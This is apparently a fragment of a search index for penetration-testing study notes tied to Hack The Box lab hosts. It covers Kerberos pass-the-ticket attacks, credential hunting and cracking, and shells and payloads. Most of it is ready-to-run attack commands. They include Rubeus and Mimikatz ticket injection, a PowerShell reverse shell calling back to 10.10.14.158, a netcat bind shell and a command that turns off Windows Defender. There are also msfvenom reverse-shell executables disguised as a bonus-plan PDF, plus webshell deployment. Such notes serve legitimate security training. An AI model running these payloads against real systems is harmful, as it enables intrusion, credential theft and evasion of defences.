/aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap</code></li> <li>Rubeus Pass the Ticket: <code>Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt</code></li> <li>Rubeus - Pass the Ticket: <code>Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi</code></li> <li>Convert .kirbi to Base64 Format: <code>[Convert]::ToBase64String([IO.File]::ReadAllBytes(\"[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi\"))</code></li> <li>Pass the Ticket - Base64 Format: <code>Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk/gHuER2XRLdV/&lt;SNIP&gt;</code></li> <li>Mimikatz - Pass the Ticket:<ol> <li><code>privilege::debug</code></li> <li><code>kerberos::ptt \"C:\\Users\\plaintext\\Desktop\\Mimikatz\\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi\"</code></li> </ol> </li> </ol>"},{"location":"passwords/passwords/#pass-the-ticket-with-powershell-remoting-windows","title":"Pass The Ticket with PowerShell Remoting (Windows)","text":"<ol> <li>Mimikatz - Pass the Ticket for Lateral Movement<ol> <li><code>mimikatz.exe</code></li> <li><code>privilege::debug</code></li> <li><code>kerberos::ptt \"C:\\Users\\Administrator.WIN01\\Desktop\\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi\"</code></li> </ol> </li> <li>Rubeus - PowerShell Remoting with Pass the Ticket: <code>Rubeus.exe createnetonly /program:\"C:\\Windows\\System32\\cmd.exe\" /show</code></li> <li>Rubeus - Pass the Ticket for Lateral Movement: <code>Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt</code></li> </ol>"},{"location":"passwords/passwords/#pass-the-ticket-ptt-from-linux","title":"Pass the Ticket (PtT) from Linux","text":"<ol> <li>realm - Check If Linux Machine is Domain Joined: <code>realm list</code></li> <li>PS - Check if Linux Machine is Domain Joined: <code>ps -ef | grep -i \"winbind\\|sssd\"</code></li> <li>Using Find to Search for Files with Keytab in the Name: <code>find / -name *keytab* -ls 2&gt;/dev/null</code></li> <li>Identifying Keytab Files in Cronjobs: <code>crontab -l</code></li> <li>Reviewing Environment Variables for ccache Files: <code>env | grep -i krb5</code></li> <li>Searching for ccache Files in /tmp: <code>ls -la /tmp</code></li> <li>Listing keytab File Information: <code>klist -k -t /opt/specialfiles/carlos.keytab</code></li> <li>Impersonating a User with a keytab:<ol> <li><code>klist</code></li> <li><code>kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab</code></li> <li><code>klist</code></li> </ol> </li> <li>Connecting to SMB Share: <code>smbclient //dc01/carlos -k -c ls</code></li> <li>Keytab Extract: <code>python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab</code></li> <li>Log in as user: <code>su - carlos@inlanefreight.htb</code></li> </ol>"},{"location":"passwords/passwords/#using-linux-attack-tools-with-kerberos","title":"Using Linux Attack Tools with Kerberos","text":"<ol> <li>Download Chisel to our Attack Host</li> <li>Connect to MS01 with xfreerdp</li> <li>Execute chisel from MS01</li> <li>Setting the KRB5CCNAME Environment Variable: <code>export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133</code></li> <li>Using Impacket with proxychains and Kerberos Authentication: <code>proxychains impacket-wmiexec dc01 -k</code></li> <li> <p>To use evil-winrm with Kerberos, we need to install the Kerberos package used for network authentication. </p> <ol> <li><code>sudo apt-get install krb5-user -y</code></li> <li>In case the package krb5-user is already installed, we need to change the configuration file /etc/krb5.confn case the package krb5-user is already installed, we need to change the configuration file /etc/krb5.conf: ```bash  [libdefaults]     default_realm = INLANEFREIGHT.HTB</li> </ol> <p> <p>[realms]     INLANEFREIGHT.HTB = {         kdc = dc01.inlanefreight.htb     } <code>`` 3. Using Evil-WinRM with Kerberos:</code>proxychains evil-winrm -i dc01 -r inlanefreight.htb<code>7. Impacket Ticket Converter:</code>impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi<code>8. Importing Converted Ticket into Windows Session with Rubeus:</code>C:\\tools\\Rubeus.exe ptt /ticket:c:\\tools\\julio.kirbi`</p>"},{"location":"passwords/passwords/#linikatz","title":"Linikatz","text":"<ol> <li>Linikatz Download and Execution: <code>wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh</code></li> <li><code>/opt/linikatz.sh</code></li> </ol>"},{"location":"passwords/passwords/#hunting-for-encoded-files","title":"Hunting for Encoded Files","text":"<ol> <li>Hunting for Files: <code>for ext in $(echo \".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*\");do echo -e \"\\nFile extension: \" $ext; find / -name *$ext 2&gt;/dev/null | grep -v \"lib\\|fonts\\|share\\|core\" ;done</code></li> </ol>"},{"location":"passwords/passwords/#hunting-for-ssh","title":"Hunting for SSH","text":"<ol> <li>Hunting for SSH Keys: <code>grep -rnw \"PRIVATE KEY\" /* 2&gt;/dev/null | grep \":1\"</code></li> <li>Encrypted SSH Keys: <code>cat /home/cry0l1t3/.ssh/SSH.private</code></li> <li>John Hashing Scripts: <code>ssh2john.py SSH.private &gt; ssh.hash</code></li> <li>Cracking SSH Keys: <code>john --wordlist=rockyou.txt ssh.hash</code></li> </ol>"},{"location":"passwords/passwords/#cracking-microsoft-office-documents","title":"Cracking Microsoft Office Documents","text":"<ol> <li><code>office2john.py Protected.docx &gt; protected-docx.hash</code></li> <li><code>cat protected-docx.hash</code></li> <li><code>john --wordlist=rockyou.txt protected-docx.hash</code></li> </ol>"},{"location":"passwords/passwords/#cracking-pdfs","title":"Cracking PDFs","text":"<ol> <li><code>pdf2john.py PDF.pdf &gt; pdf.hash</code></li> <li><code>john --wordlist=rockyou.txt pdf.hash</code></li> </ol>"},{"location":"passwords/passwords/#cracking-zip","title":"Cracking ZIP","text":"<ol> <li><code>zip2john ZIP.zip &gt; zip.hash</code></li> <li><code>john --wordlist=rockyou.txt zip.hash</code></li> </ol>"},{"location":"passwords/passwords/#cracking-openssl-encrypted-archives","title":"Cracking OpenSSL Encrypted Archives","text":"<ol> <li>Using a for-loop to Display Extracted Contents: <code>for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2&gt;/dev/null| tar xz;done</code></li> </ol>"},{"location":"passwords/passwords/#cracking-bitlocker-encrypted-drives","title":"Cracking BitLocker Encrypted Drives","text":"<ol> <li><code>bitlocker2john -i Backup.vhd &gt; backup.hashes</code></li> <li><code>grep \"bitlocker\\$0\" backup.hashes &gt; backup.hash</code></li> <li><code>hashcat -m 22100 backup.hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt -o backup.cracked</code></li> </ol>"},{"location":"shells/shells/","title":"Shells & Payloads","text":""},{"location":"shells/shells/#bind-shells","title":"Bind Shells","text":"<p>With a bind shell, the target system has a listener started and awaits a connection from a pentester's system (attack box). 1. Server - Binding a Bash shell to the TCP session: <code>rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc -l 10.129.41.200 7777 &gt; /tmp/f</code> 2. Connecting to bind shell on target: <code>nc -nv 10.129.41.200 7777</code></p>"},{"location":"shells/shells/#reverse-shells","title":"Reverse Shells","text":"<p>With a reverse shell, the attack box will have a listener running, and the target will need to initiate the connection. 1. Server (attack box): <code>sudo nc -lvnp 443</code> 2. Client (target): <code>powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"</code> 3. If Windows Defeneder stopped comunnication: <code>Set-MpPreference -DisableRealtimeMonitoring $true</code></p>"},{"location":"shells/shells/#payloads","title":"Payloads","text":"<ol> <li>Powershell One-liner: <code>powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"</code></li> <li>Bash onliner: <code>rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc -l 10.129.41.200 7777 &gt; /tmp/f</code></li> </ol>"},{"location":"shells/shells/#crafting-payloads-with-msfvenom","title":"Crafting Payloads with MSFvenom","text":"<ol> <li>List Payloads: <code>msfvenom -l payloads</code></li> <li>Building A Stageless Payload for Linux: <code>msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf &gt; createbackup.elf</code></li> <li>Building a simple Stageless Payload for a Windows system: <code>msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe &gt; BonusCompensationPlanpdf.exe</code></li> </ol>"},{"location":"shells/shells/#spawning-interactive-shells","title":"Spawning Interactive Shells","text":"<ol> <li><code>/bin/sh -i</code></li> <li>Perl To Shell:<ol> <li><code>perl \u2014e 'exec \"/bin/sh\";'</code></li> <li><code>perl: exec \"/bin/sh\";</code></li> </ol> </li> <li>Ruby To Shell: <code>ruby: exec \"/bin/sh\"</code></li> <li>Lua To Shell: <code>lua: os.execute('/bin/sh')</code></li> <li>AWK To Shell: <code>awk 'BEGIN {system(\"/bin/sh\")}'</code></li> <li>Using Find For A Shell: <code>find / -name nameoffile -exec /bin/awk 'BEGIN {system(\"/bin/sh\")}' \\;</code></li> <li>Using Exec To Launch A Shell: <code>find . -exec /bin/sh \\; -quit</code></li> <li>Vim To Shell: <code>vim -c ':!/bin/sh'</code></li> </ol>"},{"location":"shells/shells/#execution-permissions-considerations","title":"Execution Permissions Considerations","text":"<p>Use <code>sudo -l</code> to find services you can run as root. Use <code>ls -la</code> to check permission.</p>"},{"location":"shells/shells/#laudanum-one-webshell-to-rule-them-all","title":"Laudanum, One Webshell to Rule Them All","text":"<ol> <li><code>cp /usr/share/laudanum/aspx/shell.aspx /home/tester/demo.aspx</code></li> </ol>"},{"location":"shells/shells/#antak-webshell","title":"Antak Webshell","text":"<ol> <li><code>cp /usr/share/nishang/Antak-WebShell/antak.aspx /home/administrator/Upload.aspx</code></li> <li>Modify the Shell for Use (username and password)</li> </ol>"}]}